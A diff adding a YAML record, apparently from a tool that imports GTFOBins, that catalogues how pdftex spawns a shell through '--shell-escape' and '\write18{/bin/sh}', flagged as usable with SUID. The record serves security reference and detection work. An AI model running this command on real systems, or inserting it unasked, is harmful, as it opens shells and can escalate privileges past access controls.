@@ -1,0 +1,70 @@
+id: gtfobins/pdftex/shell/unprivileged
+type: binary
+platform: linux
+name: pdftex
+phases:
+- execution
+capabilities:
+- shell
+privilege_required: user
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: GPL-3.0
+  upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+  last_synced: '2026-11-13'
+commands:
+- template: pdftex --shell-escape '\write18{/bin/sh}\end'
+references:
+- https://gtfobins.github.io/gtfobins/pdftex/
+tags:
+- linux
+- unix
+- gtfobins
+source_data:
+  GTFOBins:
+    raw:
+      documents:
+        pdftex:
+          functions:
+            shell:
+            - code: pdftex --shell-escape '\write18{/bin/sh}\end'
+              contexts:
+                sudo: null
+                suid:
+                  shell: true
+                unprivileged: null
+    upstream_url: https://gtfobins.github.io/gtfobins/pdftex/
+    upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: shell
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  phases:
+  - value: execution
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  privilege_required:
+    value: user
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    GTFOBins: sha256:d999c335e4999ea6eeb550cd041bae9c60c013094b9df619d30bc16237f9b504
